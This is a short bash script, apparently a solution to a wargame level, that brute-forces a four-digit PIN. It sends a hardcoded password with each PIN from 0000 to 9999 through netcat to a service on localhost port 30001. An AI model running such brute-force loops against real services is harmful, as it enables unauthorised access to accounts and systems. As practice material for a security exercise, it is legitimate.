#!/bin/bash

current_pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in $(seq -f "%04g" 0 9999); do
    echo "$current_pass $i"
done | nc localhost 30001
